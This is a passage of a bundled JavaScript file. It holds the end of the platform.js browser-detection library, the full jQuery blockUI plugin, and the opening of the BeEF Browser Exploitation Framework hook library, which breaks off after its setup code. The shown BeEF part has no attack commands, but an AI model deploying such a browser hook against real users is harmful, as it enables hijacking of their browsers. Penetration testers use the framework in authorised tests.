            name = 'Firefox Mobile';
        }// Obscure Maxthon's unreliable version.
        else if (name == 'Maxthon' && version) {
            version = version.replace(/\.[\d.]+/, '.x');
        }// Detect Xbox 360 and Xbox One.
        else if (/\bXbox\b/i.test(product)) {
            if (product == 'Xbox 360') {
                os = null;
            }
            if (product == 'Xbox 360' && /\bIEMobile\b/.test(ua)) {
                description.unshift('mobile mode');
            }
        }// Add mobile postfix.
        else if ((/^(?:Chrome|IE|Opera)$/.test(name) || name && !product && !/Browser|Mobi/.test(name)) && (os == 'Windows CE' || /Mobi/i.test(ua))) {
            name += ' Mobile';
        }// Detect IE platform preview.
        else if (name == 'IE' && useFeatures) {
            try {
                if (context.external === null) {
                    description.unshift('platform preview');
                }
            } catch (e) {
                description.unshift('embedded');
            }
        }// Detect BlackBerry OS version.
        // http://docs.blackberry.com/en/developers/deliverables/18169/HTTP_headers_sent_by_BB_Browser_1234911_11.jsp
        else if ((/\bBlackBerry\b/.test(product) || /\bBB10\b/.test(ua)) && (data = (RegExp(product.replace(/ +/g, ' *') + '/([.\\d]+)', 'i').exec(ua) || 0)[1] || version)) {
            data = [data, /BB10/.test(ua)];
            os = (data[1] ? (product = null,
            manufacturer = 'BlackBerry') : 'Device Software') + ' ' + data[0];
            version = null;
        }// Detect Opera identifying/masking itself as another browser.
        // http://www.opera.com/support/kb/view/843/
        else if (this != forOwn && product != 'Wii' && ((useFeatures && opera) || (/Opera/.test(name) && /\b(?:MSIE|Firefox)\b/i.test(ua)) || (name == 'Firefox' && /\bOS X (?:\d+\.){2,}/.test(os)) || (name == 'IE' && ((os && !/^Win/.test(os) && version > 5.5) || /\bWindows XP\b/.test(os) && version > 8 || version == 8 && !/\bTrident\b/.test(ua)))) && !reOpera.test((data = parse.call(forOwn, ua.replace(reOpera, '') + ';'))) && data.name) {
            // When "identifying", the UA contains both Opera and the other browser's name.
            data = 'ing as ' + data.name + ((data = data.version) ? ' ' + data : '');
            if (reOpera.test(name)) {
                if (/\bIE\b/.test(data) && os == 'Mac OS') {
                    os = null;
                }
                data = 'identify' + data;
            }// When "masking", the UA contains only the other browser's name.
            else {
                data = 'mask' + data;
                if (operaClass) {
                    name = format(operaClass.replace(/([a-z])([A-Z])/g, '$1 $2'));
                } else {
                    name = 'Opera';
                }
                if (/\bIE\b/.test(data)) {
                    os = null;
                }
                if (!useFeatures) {
                    version = null;
                }
            }
            layout = ['Presto'];
            description.push(data);
        }
        // Detect WebKit Nightly and approximate Chrome/Safari versions.
        if ((data = (/\bAppleWebKit\/([\d.]+\+?)/i.exec(ua) || 0)[1])) {
            // Correct build number for numeric comparison.
            // (e.g. "532.5" becomes "532.05")
            data = [parseFloat(data.replace(/\.(\d)$/, '.0$1')), data];
            // Nightly builds are postfixed with a "+".
            if (name == 'Safari' && data[1].slice(-1) == '+') {
                name = 'WebKit Nightly';
                prerelease = 'alpha';
                version = data[1].slice(0, -1);
            }// Clear incorrect browser versions.
            else if (version == data[1] || version == (data[2] = (/\bSafari\/([\d.]+\+?)/i.exec(ua) || 0)[1])) {
                version = null;
            }
            // Use the full Chrome version when available.
            data[1] = (/\bChrome\/([\d.]+)/i.exec(ua) || 0)[1];
            // Detect Blink layout engine.
            if (data[0] == 537.36 && data[2] == 537.36 && parseFloat(data[1]) >= 28 && layout == 'WebKit') {
                layout = ['Blink'];
            }
            // Detect JavaScriptCore.
            // http://stackoverflow.com/questions/6768474/how-can-i-detect-which-javascript-engine-v8-or-jsc-is-used-at-runtime-in-androi
            if (!useFeatures || (!likeChrome && !data[1])) {
                layout && (layout[1] = 'like Safari');
                data = (data = data[0],
                data < 400 ? 1 : data < 500 ? 2 : data < 526 ? 3 : data < 533 ? 4 : data < 534 ? '4+' : data < 535 ? 5 : data < 537 ? 6 : data < 538 ? 7 : data < 601 ? 8 : '8');
            } else {
                layout && (layout[1] = 'like Chrome');
                data = data[1] || (data = data[0],
                data < 530 ? 1 : data < 532 ? 2 : data < 532.05 ? 3 : data < 533 ? 4 : data < 534.03 ? 5 : data < 534.07 ? 6 : data < 534.10 ? 7 : data < 534.13 ? 8 : data < 534.16 ? 9 : data < 534.24 ? 10 : data < 534.30 ? 11 : data < 535.01 ? 12 : data < 535.02 ? '13+' : data < 535.07 ? 15 : data < 535.11 ? 16 : data < 535.19 ? 17 : data < 536.05 ? 18 : data < 536.10 ? 19 : data < 537.01 ? 20 : data < 537.11 ? '21+' : data < 537.13 ? 23 : data < 537.18 ? 24 : data < 537.24 ? 25 : data < 537.36 ? 26 : layout != 'Blink' ? '27' : '28');
            }
            // Add the postfix of ".x" or "+" for approximate versions.
            layout && (layout[1] += ' ' + (data += typeof data == 'number' ? '.x' : /[.+]/.test(data) ? '' : '+'));
            // Obscure version for some Safari 1-2 releases.
            if (name == 'Safari' && (!version || parseInt(version) > 45)) {
                version = data;
            }
        }
        // Detect Opera desktop modes.
        if (name == 'Opera' && (data = /\bzbov|zvav$/.exec(os))) {
            name += ' ';
            description.unshift('desktop mode');
            if (data == 'zvav') {
                name += 'Mini';
                version = null;
            } else {
                name += 'Mobile';
            }
            os = os.replace(RegExp(' *' + data + '$'), '');
        }// Detect Chrome desktop mode.
        else if (name == 'Safari' && /\bChrome\b/.exec(layout && layout[1])) {
            description.unshift('desktop mode');
            name = 'Chrome Mobile';
            version = null;

            if (/\bOS X\b/.test(os)) {
                manufacturer = 'Apple';
                os = 'iOS 4.3+';
            } else {
                os = null;
            }
        }
        // Strip incorrect OS versions.
        if (version && version.indexOf((data = /[\d.]+$/.exec(os))) == 0 && ua.indexOf('/' + data + '-') > -1) {
            os = trim(os.replace(data, ''));
        }
        // Add layout engine.
        if (layout && !/\b(?:Avant|Nook)\b/.test(name) && (/Browser|Lunascape|Maxthon/.test(name) || name != 'Safari' && /^iOS/.test(os) && /\bSafari\b/.test(layout[1]) || /^(?:Adobe|Arora|Breach|Midori|Opera|Phantom|Rekonq|Rock|Samsung Internet|Sleipnir|Web)/.test(name) && layout[1])) {
            // Don't add layout details to description if they are falsey.
            (data = layout[layout.length - 1]) && description.push(data);
        }
        // Combine contextual information.
        if (description.length) {
            description = ['(' + description.join('; ') + ')'];
        }
        // Append manufacturer to description.
        if (manufacturer && product && product.indexOf(manufacturer) < 0) {
            description.push('on ' + manufacturer);
        }
        // Append product to description.
        if (product) {
            description.push((/^on /.test(description[description.length - 1]) ? '' : 'on ') + product);
        }
        // Parse the OS into an object.
        if (os) {
            data = / ([\d.+]+)$/.exec(os);
            isSpecialCasedOS = data && os.charAt(os.length - data[0].length - 1) == '/';
            os = {
                'architecture': 32,
                'family': (data && !isSpecialCasedOS) ? os.replace(data[0], '') : os,
                'version': data ? data[1] : null,
                'toString': function() {
                    var version = this.version;
                    return this.family + ((version && !isSpecialCasedOS) ? ' ' + version : '') + (this.architecture == 64 ? ' 64-bit' : '');
                }
            };
        }
        // Add browser/OS architecture.
        if ((data = /\b(?:AMD|IA|Win|WOW|x86_|x)64\b/i.exec(arch)) && !/\bi686\b/i.test(arch)) {
            if (os) {
                os.architecture = 64;
                os.family = os.family.replace(RegExp(' *' + data), '');
            }
            if (name && (/\bWOW64\b/i.test(ua) || (useFeatures && /\w(?:86|32)$/.test(nav.cpuClass || nav.platform) && !/\bWin64; x64\b/i.test(ua)))) {
                description.unshift('32-bit');
            }
        }// Chrome 39 and above on OS X is always 64-bit.
        else if (os && /^OS X/.test(os.family) && name == 'Chrome' && parseFloat(version) >= 39) {
            os.architecture = 64;
        }

        ua || (ua = null);

        /*------------------------------------------------------------------------*/

        /**
     * The platform object.
     *
     * @name platform
     * @type Object
     */
        var platform = {};

        /**
     * The platform description.
     *
     * @memberOf platform
     * @type string|null
     */
        platform.description = ua;

        /**
     * The name of the browser's layout engine.
     *
     * The list of common layout engines include:
     * "Blink", "EdgeHTML", "Gecko", "Trident" and "WebKit"
     *
     * @memberOf platform
     * @type string|null
     */
        platform.layout = layout && layout[0];

        /**
     * The name of the product's manufacturer.
     *
     * The list of manufacturers include:
     * "Apple", "Archos", "Amazon", "Asus", "Barnes & Noble", "BlackBerry",
     * "Google", "HP", "HTC", "LG", "Microsoft", "Motorola", "Nintendo",
     * "Nokia", "Samsung" and "Sony"
     *
     * @memberOf platform
     * @type string|null
     */
        platform.manufacturer = manufacturer;

        /**
     * The name of the browser/environment.
     *
     * The list of common browser names include:
     * "Chrome", "Electron", "Firefox", "Firefox for iOS", "IE",
     * "Microsoft Edge", "PhantomJS", "Safari", "SeaMonkey", "Silk",
     * "Opera Mini" and "Opera"
     *
     * Mobile versions of some browsers have "Mobile" appended to their name:
     * eg. "Chrome Mobile", "Firefox Mobile", "IE Mobile" and "Opera Mobile"
     *
     * @memberOf platform
     * @type string|null
     */
        platform.name = name;

        /**
     * The alpha/beta release indicator.
     *
     * @memberOf platform
     * @type string|null
     */
        platform.prerelease = prerelease;

        /**
     * The name of the product hosting the browser.
     *
     * The list of common products include:
     *
     * "BlackBerry", "Galaxy S4", "Lumia", "iPad", "iPod", "iPhone", "Kindle",
     * "Kindle Fire", "Nexus", "Nook", "PlayBook", "TouchPad" and "Transformer"
     *
     * @memberOf platform
     * @type string|null
     */
        platform.product = product;

        /**
     * The browser's user agent string.
     *
     * @memberOf platform
     * @type string|null
     */
        platform.ua = ua;

        /**
     * The browser/environment version.
     *
     * @memberOf platform
     * @type string|null
     */
        platform.version = name && version;

        /**
     * The name of the operating system.
     *
     * @memberOf platform
     * @type Object
     */
        platform.os = os || {

            /**
       * The CPU architecture the OS is built for.
       *
       * @memberOf platform.os
       * @type number|null
       */
            'architecture': null,

            /**
       * The family of the OS.
       *
       * Common values include:
       * "Windows", "Windows Server 2008 R2 / 7", "Windows Server 2008 / Vista",
       * "Windows XP", "OS X", "Ubuntu", "Debian", "Fedora", "Red Hat", "SuSE",
       * "Android", "iOS" and "Windows Phone"
       *
       * @memberOf platform.os
       * @type string|null
       */
            'family': null,

            /**
       * The version of the OS.
       *
       * @memberOf platform.os
       * @type string|null
       */
            'version': null,

            /**
       * Returns the OS string.
       *
       * @memberOf platform.os
       * @returns {string} The OS string.
       */
            'toString': function() {
                return 'null';
            }
        };

        platform.parse = parse;
        platform.toString = toStringPlatform;

        if (platform.version) {
            description.unshift(version);
        }
        if (platform.name) {
            description.unshift(name);
        }
        if (os && name && !(os == String(os).split(' ')[0] && (os == name.split(' ')[0] || product))) {
            description.push(product ? '(' + os + ')' : 'on ' + os);
        }
        if (description.length) {
            platform.description = description.join(' ');
        }
        return platform;
    }

    /*--------------------------------------------------------------------------*/

    // Export platform.
    var platform = parse();

    // Some AMD build optimizers, like r.js, check for condition patterns like the following:
    if (typeof define == 'function' && typeof define.amd == 'object' && define.amd) {
        // Expose platform on the global object to prevent errors when platform is
        // loaded by a script tag in the presence of an AMD loader.
        // See http://requirejs.org/docs/errors.html#mismatch for more details.
        root.platform = platform;

        // Define as an anonymous module so platform can be aliased through path mapping.
        define(function() {
            return platform;
        });
    }// Check for `exports` after `define` in case a build optimizer adds an `exports` object.
    else if (freeExports && freeModule) {
        // Export for CommonJS support.
        forOwn(platform, function(value, key) {
            freeExports[key] = value;
        });
    } else {
        // Export to the global object.
        root.platform = platform;
    }
}
.call(this));

/*!
 * jQuery blockUI plugin
 * Version 2.70.0-2014.11.23
 * Requires jQuery v1.7 or later
 *
 * Examples at: http://malsup.com/jquery/block/
 * Copyright (c) 2007-2013 M. Alsup
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 *
 * Thanks to Amir-Hossein Sobhi for some excellent contributions!
 */

;(function() {
    /*jshint eqeqeq:false curly:false latedef:false */
    "use strict";

    function setup($) {
        $.fn._fadeIn = $.fn.fadeIn;

        var noOp = $.noop || function() {}
        ;

        // this bit is to ensure we don't call setExpression when we shouldn't (with extra muscle to handle
        // confusing userAgent strings on Vista)
        var msie = /MSIE/.test(navigator.userAgent);
        var ie6 = /MSIE 6.0/.test(navigator.userAgent) && !/MSIE 8.0/.test(navigator.userAgent);
        var mode = document.documentMode || 0;
        var setExpr = $.isFunction(document.createElement('div').style.setExpression);

        // global $ methods for blocking/unblocking the entire page
        $.blockUI = function(opts) {
            install(window, opts);
        }
        ;
        $.unblockUI = function(opts) {
            remove(window, opts);
        }
        ;

        // convenience method for quick growl-like notifications  (http://www.google.com/search?q=growl)
        $.growlUI = function(title, message, timeout, onClose) {
            var $m = $('<div class="growlUI"></div>');
            if (title)
                $m.append('<h1>' + title + '</h1>');
            if (message)
                $m.append('<h2>' + message + '</h2>');
            if (timeout === undefined)
                timeout = 3000;

            // Added by konapun: Set timeout to 30 seconds if this growl is moused over, like normal toast notifications
            var callBlock = function(opts) {
                opts = opts || {};

                $.blockUI({
                    message: $m,
                    fadeIn: typeof opts.fadeIn !== 'undefined' ? opts.fadeIn : 700,
                    fadeOut: typeof opts.fadeOut !== 'undefined' ? opts.fadeOut : 1000,
                    timeout: typeof opts.timeout !== 'undefined' ? opts.timeout : timeout,
                    centerY: false,
                    showOverlay: false,
                    onUnblock: onClose,
                    css: $.blockUI.defaults.growlCSS
                });
            };

            callBlock();
            var nonmousedOpacity = $m.css('opacity');
            $m.mouseover(function() {
                callBlock({
                    fadeIn: 0,
                    timeout: 30000
                });

                var displayBlock = $('.blockMsg');
                displayBlock.stop();
                // cancel fadeout if it has started
                displayBlock.fadeTo(300, 1);
                // make it easier to read the message by removing transparency
            }).mouseout(function() {
                $('.blockMsg').fadeOut(1000);
            });
            // End konapun additions
        }
        ;

        // plugin method for blocking element content
        $.fn.block = function(opts) {
            if (this[0] === window) {
                $.blockUI(opts);
                return this;
            }
            var fullOpts = $.extend({}, $.blockUI.defaults, opts || {});
            this.each(function() {
                var $el = $(this);
                if (fullOpts.ignoreIfBlocked && $el.data('blockUI.isBlocked'))
                    return;
                $el.unblock({
                    fadeOut: 0
                });
            });

            return this.each(function() {
                if ($.css(this, 'position') == 'static') {
                    this.style.position = 'relative';
                    $(this).data('blockUI.static', true);
                }
                this.style.zoom = 1;
                // force 'hasLayout' in ie
                install(this, opts);
            });
        }
        ;

        // plugin method for unblocking element content
        $.fn.unblock = function(opts) {
            if (this[0] === window) {
                $.unblockUI(opts);
                return this;
            }
            return this.each(function() {
                remove(this, opts);
            });
        }
        ;

        $.blockUI.version = 2.70;
        // 2nd generation blocking at no extra cost!

        // override these in your code to change the default behavior and style
        $.blockUI.defaults = {
            // message displayed when blocking (use null for no message)
            message: '<h1>Please wait...</h1>',

            title: null,
            // title string; only used when theme == true
            draggable: true,
            // only used when theme == true (requires jquery-ui.js to be loaded)

            theme: false,
            // set to true to use with jQuery UI themes

            // styles for the message when blocking; if you wish to disable
            // these and use an external stylesheet then do this in your code:
            // $.blockUI.defaults.css = {};
            css: {
                padding: 0,
                margin: 0,
                width: '30%',
                top: '40%',
                left: '35%',
                textAlign: 'center',
                color: '#000',
                border: '3px solid #aaa',
                backgroundColor: '#fff',
                cursor: 'wait'
            },

            // minimal style set used when themes are used
            themedCSS: {
                width: '30%',
                top: '40%',
                left: '35%'
            },

            // styles for the overlay
            overlayCSS: {
                backgroundColor: '#000',
                opacity: 0.6,
                cursor: 'wait'
            },

            // style to replace wait cursor before unblocking to correct issue
            // of lingering wait cursor
            cursorReset: 'default',

            // styles applied when using $.growlUI
            growlCSS: {
                width: '350px',
                top: '10px',
                left: '',
                right: '10px',
                border: 'none',
                padding: '5px',
                opacity: 0.6,
                cursor: 'default',
                color: '#fff',
                backgroundColor: '#000',
                '-webkit-border-radius': '10px',
                '-moz-border-radius': '10px',
                'border-radius': '10px'
            },

            // IE issues: 'about:blank' fails on HTTPS and javascript:false is s-l-o-w
            // (hat tip to Jorge H. N. de Vasconcelos)
            /*jshint scripturl:true */
            iframeSrc: /^https/i.test(window.location.href || '') ? 'javascript:false' : 'about:blank',

            // force usage of iframe in non-IE browsers (handy for blocking applets)
            forceIframe: false,

            // z-index for the blocking overlay
            baseZ: 1000,

            // set these to true to have the message automatically centered
            centerX: true,
            // <-- only effects element blocking (page block controlled via css above)
            centerY: true,

            // allow body element to be stetched in ie6; this makes blocking look better
            // on "short" pages.  disable if you wish to prevent changes to the body height
            allowBodyStretch: true,

            // enable if you want key and mouse events to be disabled for content that is blocked
            bindEvents: true,

            // be default blockUI will supress tab navigation from leaving blocking content
            // (if bindEvents is true)
            constrainTabKey: true,

            // fadeIn time in millis; set to 0 to disable fadeIn on block
            fadeIn: 200,

            // fadeOut time in millis; set to 0 to disable fadeOut on unblock
            fadeOut: 400,

            // time in millis to wait before auto-unblocking; set to 0 to disable auto-unblock
            timeout: 0,

            // disable if you don't want to show the overlay
            showOverlay: true,

            // if true, focus will be placed in the first available input field when
            // page blocking
            focusInput: true,

            // elements that can receive focus
            focusableElements: ':input:enabled:visible',

            // suppresses the use of overlay styles on FF/Linux (due to performance issues with opacity)
            // no longer needed in 2012
            // applyPlatformOpacityRules: true,

            // callback method invoked when fadeIn has completed and blocking message is visible
            onBlock: null,

            // callback method invoked when unblocking has completed; the callback is
            // passed the element that has been unblocked (which is the window object for page
            // blocks) and the options that were passed to the unblock call:
            //	onUnblock(element, options)
            onUnblock: null,

            // callback method invoked when the overlay area is clicked.
            // setting this will turn the cursor to a pointer, otherwise cursor defined in overlayCss will be used.
            onOverlayClick: null,

            // don't ask; if you really must know: http://groups.google.com/group/jquery-en/browse_thread/thread/36640a8730503595/2f6a79a77a78e493#2f6a79a77a78e493
            quirksmodeOffsetHack: 4,

            // class name of the message block
            blockMsgClass: 'blockMsg',

            // if it is already blocked, then ignore it (don't unblock and reblock)
            ignoreIfBlocked: false
        };

        // private data and functions follow...

        var pageBlock = null;
        var pageBlockEls = [];

        function install(el, opts) {
            var css, themedCSS;
            var full = (el == window);
            var msg = (opts && opts.message !== undefined ? opts.message : undefined);
            opts = $.extend({}, $.blockUI.defaults, opts || {});

            if (opts.ignoreIfBlocked && $(el).data('blockUI.isBlocked'))
                return;

            opts.overlayCSS = $.extend({}, $.blockUI.defaults.overlayCSS, opts.overlayCSS || {});
            css = $.extend({}, $.blockUI.defaults.css, opts.css || {});
            if (opts.onOverlayClick)
                opts.overlayCSS.cursor = 'pointer';

            themedCSS = $.extend({}, $.blockUI.defaults.themedCSS, opts.themedCSS || {});
            msg = msg === undefined ? opts.message : msg;

            // remove the current block (if there is one)
            if (full && pageBlock)
                remove(window, {
                    fadeOut: 0
                });

            // if an existing element is being used as the blocking content then we capture
            // its current place in the DOM (and current display style) so we can restore
            // it when we unblock
            if (msg && typeof msg != 'string' && (msg.parentNode || msg.jquery)) {
                var node = msg.jquery ? msg[0] : msg;
                var data = {};
                $(el).data('blockUI.history', data);
                data.el = node;
                data.parent = node.parentNode;
                data.display = node.style.display;
                data.position = node.style.position;
                if (data.parent)
                    data.parent.removeChild(node);
            }

            $(el).data('blockUI.onUnblock', opts.onUnblock);
            var z = opts.baseZ;

            // blockUI uses 3 layers for blocking, for simplicity they are all used on every platform;
            // layer1 is the iframe layer which is used to supress bleed through of underlying content
            // layer2 is the overlay layer which has opacity and a wait cursor (by default)
            // layer3 is the message content that is displayed while blocking
            var lyr1, lyr2, lyr3, s;
            if (msie || opts.forceIframe)
                lyr1 = $('<iframe class="blockUI" style="z-index:' + (z++) + ';display:none;border:none;margin:0;padding:0;position:absolute;width:100%;height:100%;top:0;left:0" src="' + opts.iframeSrc + '"></iframe>');
            else
                lyr1 = $('<div class="blockUI" style="display:none"></div>');

            if (opts.theme)
                lyr2 = $('<div class="blockUI blockOverlay ui-widget-overlay" style="z-index:' + (z++) + ';display:none"></div>');
            else
                lyr2 = $('<div class="blockUI blockOverlay" style="z-index:' + (z++) + ';display:none;border:none;margin:0;padding:0;width:100%;height:100%;top:0;left:0"></div>');

            if (opts.theme && full) {
                s = '<div class="blockUI ' + opts.blockMsgClass + ' blockPage ui-dialog ui-widget ui-corner-all" style="z-index:' + (z + 10) + ';display:none;position:fixed">';
                if (opts.title) {
                    s += '<div class="ui-widget-header ui-dialog-titlebar ui-corner-all blockTitle">' + (opts.title || '&nbsp;') + '</div>';
                }
                s += '<div class="ui-widget-content ui-dialog-content"></div>';
                s += '</div>';
            } else if (opts.theme) {
                s = '<div class="blockUI ' + opts.blockMsgClass + ' blockElement ui-dialog ui-widget ui-corner-all" style="z-index:' + (z + 10) + ';display:none;position:absolute">';
                if (opts.title) {
                    s += '<div class="ui-widget-header ui-dialog-titlebar ui-corner-all blockTitle">' + (opts.title || '&nbsp;') + '</div>';
                }
                s += '<div class="ui-widget-content ui-dialog-content"></div>';
                s += '</div>';
            } else if (full) {
                s = '<div class="blockUI ' + opts.blockMsgClass + ' blockPage" style="z-index:' + (z + 10) + ';display:none;position:fixed"></div>';
            } else {
                s = '<div class="blockUI ' + opts.blockMsgClass + ' blockElement" style="z-index:' + (z + 10) + ';display:none;position:absolute"></div>';
            }
            lyr3 = $(s);

            // if we have a message, style it
            if (msg) {
                if (opts.theme) {
                    lyr3.css(themedCSS);
                    lyr3.addClass('ui-widget-content');
                } else
                    lyr3.css(css);
            }

            // style the overlay
            if (!opts.theme /*&& (!opts.applyPlatformOpacityRules)*/
            )
                lyr2.css(opts.overlayCSS);
            lyr2.css('position', full ? 'fixed' : 'absolute');

            // make iframe layer transparent in IE
            if (msie || opts.forceIframe)
                lyr1.css('opacity', 0.0);

            //$([lyr1[0],lyr2[0],lyr3[0]]).appendTo(full ? 'body' : el);
            var layers = [lyr1, lyr2, lyr3]
              , $par = full ? $('body') : $(el);
            $.each(layers, function() {
                this.appendTo($par);
            });

            if (opts.theme && opts.draggable && $.fn.draggable) {
                lyr3.draggable({
                    handle: '.ui-dialog-titlebar',
                    cancel: 'li'
                });
            }

            // ie7 must use absolute positioning in quirks mode and to account for activex issues (when scrolling)
            var expr = setExpr && (!$.support.boxModel || $('object,embed', full ? null : el).length > 0);
            if (ie6 || expr) {
                // give body 100% height
                if (full && opts.allowBodyStretch && $.support.boxModel)
                    $('html,body').css('height', '100%');

                // fix ie6 issue when blocked element has a border width
                if ((ie6 || !$.support.boxModel) && !full) {
                    var t = sz(el, 'borderTopWidth')
                      , l = sz(el, 'borderLeftWidth');
                    var fixT = t ? '(0 - ' + t + ')' : 0;
                    var fixL = l ? '(0 - ' + l + ')' : 0;
                }

                // simulate fixed position
                $.each(layers, function(i, o) {
                    var s = o[0].style;
                    s.position = 'absolute';
                    if (i < 2) {
                        if (full)
                            s.setExpression('height', 'Math.max(document.body.scrollHeight, document.body.offsetHeight) - (jQuery.support.boxModel?0:' + opts.quirksmodeOffsetHack + ') + "px"');
                        else
                            s.setExpression('height', 'this.parentNode.offsetHeight + "px"');
                        if (full)
                            s.setExpression('width', 'jQuery.support.boxModel && document.documentElement.clientWidth || document.body.clientWidth + "px"');
                        else
                            s.setExpression('width', 'this.parentNode.offsetWidth + "px"');
                        if (fixL)
                            s.setExpression('left', fixL);
                        if (fixT)
                            s.setExpression('top', fixT);
                    } else if (opts.centerY) {
                        if (full)
                            s.setExpression('top', '(document.documentElement.clientHeight || document.body.clientHeight) / 2 - (this.offsetHeight / 2) + (blah = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + "px"');
                        s.marginTop = 0;
                    } else if (!opts.centerY && full) {
                        var top = (opts.css && opts.css.top) ? parseInt(opts.css.top, 10) : 0;
                        var expression = '((document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + ' + top + ') + "px"';
                        s.setExpression('top', expression);
                    }
                });
            }

            // show the message
            if (msg) {
                if (opts.theme)
                    lyr3.find('.ui-widget-content').append(msg);
                else
                    lyr3.append(msg);
                if (msg.jquery || msg.nodeType)
                    $(msg).show();
            }

            if ((msie || opts.forceIframe) && opts.showOverlay)
                lyr1.show();
            // opacity is zero
            if (opts.fadeIn) {
                var cb = opts.onBlock ? opts.onBlock : noOp;
                var cb1 = (opts.showOverlay && !msg) ? cb : noOp;
                var cb2 = msg ? cb : noOp;
                if (opts.showOverlay)
                    lyr2._fadeIn(opts.fadeIn, cb1);
                if (msg)
                    lyr3._fadeIn(opts.fadeIn, cb2);
            } else {
                if (opts.showOverlay)
                    lyr2.show();
                if (msg)
                    lyr3.show();
                if (opts.onBlock)
                    opts.onBlock.bind(lyr3)();
            }

            // bind key and mouse events
            bind(1, el, opts);

            if (full) {
                pageBlock = lyr3[0];
                pageBlockEls = $(opts.focusableElements, pageBlock);
                if (opts.focusInput)
                    setTimeout(focus, 20);
            } else
                center(lyr3[0], opts.centerX, opts.centerY);

            if (opts.timeout) {
                // auto-unblock
                var to = setTimeout(function() {
                    if (full)
                        $.unblockUI(opts);
                    else
                        $(el).unblock(opts);
                }, opts.timeout);
                $(el).data('blockUI.timeout', to);
            }
        }

        // remove the block
        function remove(el, opts) {
            var count;
            var full = (el == window);
            var $el = $(el);
            var data = $el.data('blockUI.history');
            var to = $el.data('blockUI.timeout');
            if (to) {
                clearTimeout(to);
                $el.removeData('blockUI.timeout');
            }
            opts = $.extend({}, $.blockUI.defaults, opts || {});
            bind(0, el, opts);
            // unbind events

            if (opts.onUnblock === null) {
                opts.onUnblock = $el.data('blockUI.onUnblock');
                $el.removeData('blockUI.onUnblock');
            }

            var els;
            if (full)
                // crazy selector to handle odd field errors in ie6/7
                els = $('body').children().filter('.blockUI').add('body > .blockUI');
            else
                els = $el.find('>.blockUI');

            // fix cursor issue
            if (opts.cursorReset) {
                if (els.length > 1)
                    els[1].style.cursor = opts.cursorReset;
                if (els.length > 2)
                    els[2].style.cursor = opts.cursorReset;
            }

            if (full)
                pageBlock = pageBlockEls = null;

            if (opts.fadeOut) {
                count = els.length;
                els.stop().fadeOut(opts.fadeOut, function() {
                    if (--count === 0)
                        reset(els, data, opts, el);
                });
            } else
                reset(els, data, opts, el);
        }

        // move blocking element back into the DOM where it started
        function reset(els, data, opts, el) {
            var $el = $(el);
            if ($el.data('blockUI.isBlocked'))
                return;

            els.each(function(i, o) {
                // remove via DOM calls so we don't lose event handlers
                if (this.parentNode)
                    this.parentNode.removeChild(this);
            });

            if (data && data.el) {
                data.el.style.display = data.display;
                data.el.style.position = data.position;
                data.el.style.cursor = 'default';
                // #59
                if (data.parent)
                    data.parent.appendChild(data.el);
                $el.removeData('blockUI.history');
            }

            if ($el.data('blockUI.static')) {
                $el.css('position', 'static');
                // #22
            }

            if (typeof opts.onUnblock == 'function')
                opts.onUnblock(el, opts);

            // fix issue in Safari 6 where block artifacts remain until reflow
            var body = $(document.body)
              , w = body.width()
              , cssW = body[0].style.width;
            body.width(w - 1).width(w);
            body[0].style.width = cssW;
        }

        // bind/unbind the handler
        function bind(b, el, opts) {
            var full = el == window
              , $el = $(el);

            // don't bother unbinding if there is nothing to unbind
            if (!b && (full && !pageBlock || !full && !$el.data('blockUI.isBlocked')))
                return;

            $el.data('blockUI.isBlocked', b);

            // don't bind events when overlay is not in use or if bindEvents is false
            if (!full || !opts.bindEvents || (b && !opts.showOverlay))
                return;

            // bind anchors and inputs for mouse and key events
            var events = 'mousedown mouseup keydown keypress keyup touchstart touchend touchmove';
            if (b)
                $(document).bind(events, opts, handler);
            else
                $(document).unbind(events, handler);

            // former impl...
            //		var $e = $('a,:input');
            //		b ? $e.bind(events, opts, handler) : $e.unbind(events, handler);
        }

        // event handler to suppress keyboard/mouse events when blocking
        function handler(e) {
            // allow tab navigation (conditionally)
            if (e.type === 'keydown' && e.keyCode && e.keyCode == 9) {
                if (pageBlock && e.data.constrainTabKey) {
                    var els = pageBlockEls;
                    var fwd = !e.shiftKey && e.target === els[els.length - 1];
                    var back = e.shiftKey && e.target === els[0];
                    if (fwd || back) {
                        setTimeout(function() {
                            focus(back);
                        }, 10);
                        return false;
                    }
                }
            }
            var opts = e.data;
            var target = $(e.target);
            if (target.hasClass('blockOverlay') && opts.onOverlayClick)
                opts.onOverlayClick(e);

            // allow events within the message content
            if (target.parents('div.' + opts.blockMsgClass).length > 0)
                return true;

            // allow events for content that is not being blocked
            return target.parents().children().filter('div.blockUI').length === 0;
        }

        function focus(back) {
            if (!pageBlockEls)
                return;
            var e = pageBlockEls[back === true ? pageBlockEls.length - 1 : 0];
            if (e)
                e.focus();
        }

        function center(el, x, y) {
            var p = el.parentNode
              , s = el.style;
            var l = ((p.offsetWidth - el.offsetWidth) / 2) - sz(p, 'borderLeftWidth');
            var t = ((p.offsetHeight - el.offsetHeight) / 2) - sz(p, 'borderTopWidth');
            if (x)
                s.left = l > 0 ? (l + 'px') : '0';
            if (y)
                s.top = t > 0 ? (t + 'px') : '0';
        }

        function sz(el, p) {
            return parseInt($.css(el, p), 10) || 0;
        }

    }

    /*global define:true */
    if (typeof define === 'function' && define.amd && define.amd.jQuery) {
        define(['jquery'], setup);
    } else {
        setup(jQuery);
    }

}
)();

//
// Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * BeEF JS Library 0.5.0.0
 * Register the BeEF JS on the window object.
 */

$j = jQuery.noConflict();

if (typeof beef === 'undefined' && typeof window.beef === 'undefined') {

    var BeefJS = {

        version: '0.5.0.0',

        // This get set to true during window.onload(). It's a useful hack when messing with document.write().
        pageIsLoaded: false,

        // An array containing functions to be executed by the window.onpopstate() method.
        onpopstate: new Array(),

        // An array containing functions to be executed by the window.onclose() method.
        onclose: new Array(),

        // An array containing functions to be executed by Beef.
        commands: new Array(),

        // An array containing all the BeEF JS components.
        components: new Array(),

        /**
         * Adds a function to display debug messages (wraps console.log())
         * @param: {string} the debug string to return
         */
        debug: function(msg) {
            if (!false)
                return;
            if (typeof console == "object" && typeof console.log == "function") {
                var currentdate = new Date();
                var pad = function(n) {
                    return ("0" + n).slice(-2);
                }
